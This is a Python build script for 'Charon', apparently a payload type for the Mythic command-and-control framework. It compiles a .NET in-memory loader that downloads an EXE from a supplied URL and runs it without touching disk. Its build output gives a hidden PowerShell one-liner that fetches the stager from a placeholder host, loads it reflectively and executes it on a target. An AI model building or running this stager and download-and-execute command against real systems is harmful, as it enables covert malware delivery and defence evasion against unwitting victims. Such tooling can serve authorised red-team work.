import pathlib
from mythic_container.PayloadBuilder import *
from mythic_container.MythicRPC import *
import tempfile
import asyncio
import base64
import os


class CharonAgent(PayloadType):
    name = "Charon"
    file_extension = "exe"
    author = "@PatchRequest"
    supported_os = [SupportedOS.Windows]
    wrapper = False
    wrapped_payloads = []
    note = "In-memory loader — PowerShell one-liner with .NET RunPE stager for fileless execution"
    supports_dynamic_loading = False
    c2_profiles = []
    mythic_encrypts = False
    translation_container = None
    build_parameters = [
        BuildParameter(
            name="download_url",
            parameter_type=BuildParameterType.String,
            description="URL where the wrapped payload EXE is hosted (stager downloads from here at runtime)",
            required=True,
        ),
    ]
    agent_path = pathlib.Path(".") / "Charon"
    agent_icon_path = None
    agent_code_path = agent_path / "agent_code"

    build_steps = [
        BuildStep(step_name="Configuring Stager", step_description="Stamping configuration into .NET stager"),
        BuildStep(step_name="Compiling Stager", step_description="Compiling .NET EXE with mcs"),
    ]

    async def build(self) -> BuildResponse:
        resp = BuildResponse(status=BuildStatus.Success)

        download_url = self.get_parameter("download_url")

        # --- Read and stamp C# stager template ---
        stager_template_path = self.agent_code_path / "Stager.cs"
        stager_code = stager_template_path.read_text()
        stager_code = stager_code.replace("%DOWNLOAD_URL%", download_url)

        await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
            PayloadUUID=self.uuid,
            StepName="Configuring Stager",
            StepStdout=f"Download URL: {download_url}",
            StepSuccess=True,
        ))

        # --- Compile with Mono mcs ---
        with tempfile.TemporaryDirectory(suffix=self.uuid) as tmpdir:
            cs_path = os.path.join(tmpdir, "Stager.cs")
            exe_path = os.path.join(tmpdir, "Charon.exe")

            with open(cs_path, "w") as f:
                f.write(stager_code)

            compile_cmd = (
                f"mcs -target:exe -optimize+ "
                f"-out:{exe_path} "
                f"-reference:System.dll "
                f"{cs_path}"
            )
            proc = await asyncio.create_subprocess_shell(
                compile_cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, stderr = await proc.communicate()

            if proc.returncode != 0:
                error_msg = stderr.decode(errors="replace")
                await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                    PayloadUUID=self.uuid,
                    StepName="Compiling Stager",
                    StepStdout=f"Compilation failed:\n{error_msg}",
                    StepSuccess=False,
                ))
                resp.status = BuildStatus.Error
                resp.build_message = error_msg
                return resp

            with open(exe_path, "rb") as f:
                assembly_bytes = f.read()

        await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
            PayloadUUID=self.uuid,
            StepName="Compiling Stager",
            StepStdout=(
                f"Compiled .NET stager EXE ({len(assembly_bytes)} bytes)\n\n"
                f"Usage: Host this EXE and run on target:\n"
                f"powershell -nop -w hidden -c \"[Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('http://YOUR_HOST/charon.exe'));[Charon.Stager]::Execute()\""
            ),
            StepSuccess=True,
        ))

        resp.payload = assembly_bytes
        resp.build_message = "Charon stager built successfully"
        return resp
